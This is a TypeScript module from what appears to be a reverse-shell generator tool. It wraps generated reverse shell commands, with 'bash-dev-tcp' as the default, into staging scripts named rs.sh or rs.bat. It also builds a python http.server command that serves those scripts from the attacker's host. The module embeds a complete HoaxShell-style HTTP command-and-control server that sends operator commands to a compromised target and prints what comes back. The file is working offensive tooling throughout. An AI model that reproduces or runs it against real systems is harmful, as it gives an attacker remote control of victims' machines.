import { reverseShellTemplates } from "./catalog";
import { generateReverseShell } from "./generate";
import { getConnectionModeById } from "./template-meta";
import type { ReverseShellConfig } from "./types";

export const defaultStageTemplateId = "bash-dev-tcp";

export function stageTemplateOptions() {
  return reverseShellTemplates.filter(
    (template) => getConnectionModeById(template.id) === "reverse",
  );
}

export function createStageScript(
  config: ReverseShellConfig,
  stageTemplateId = defaultStageTemplateId,
): string {
  const stageConfig: ReverseShellConfig = {
    ...config,
    templateId: stageTemplateId,
    obfuscation: "none",
  };
  const generated = generateReverseShell(stageConfig);

  return `#!/bin/bash\n${generated.rawCommand}\n`;
}

export function stageFileName(config: ReverseShellConfig): string {
  return config.templateId.includes("powershell") ? "rs.bat" : "rs.sh";
}

export function stageServeCommand(config: ReverseShellConfig): string {
  return `python3 -m http.server ${config.httpPort ?? config.lport} --bind ${config.lhost}`;
}

export function hoaxShellServerFileName(): string {
  return "hoaxshell_server.py";
}

export function hoaxShellServerCommand(config: ReverseShellConfig): string {
  return `python3 ${hoaxShellServerFileName()} --host ${config.lhost} --port ${config.lport}`;
}

export function createHoaxShellServerScript(config: ReverseShellConfig): string {
  return `#!/usr/bin/env python3
import argparse
import queue
import sys
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

parser = argparse.ArgumentParser(description="Minimal HoaxShell-style command server")
parser.add_argument("--host", default="${config.lhost}")
parser.add_argument("--port", type=int, default=${config.lport})
args = parser.parse_args()
commands = queue.Queue()

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            command = commands.get_nowait()
        except queue.Empty:
            command = ""
        data = command.encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0"))
        output = self.rfile.read(length).decode(errors="replace")
        if output.strip():
            print("\\n--- target output ---")
            print(output.rstrip())
            print("---------------------")
        self.send_response(204)
        self.end_headers()

    def log_message(self, fmt, *args):
        return

def read_commands():
    while True:
        try:
            command = input("hoax> ").strip()
        except EOFError:
            break
        if command:
            commands.put(command)

threading.Thread(target=read_commands, daemon=True).start()
server = ThreadingHTTPServer((args.host, args.port), Handler)
print(f"Listening on http://{args.host}:{args.port} - type commands at hoax>")
server.serve_forever()
`;
}
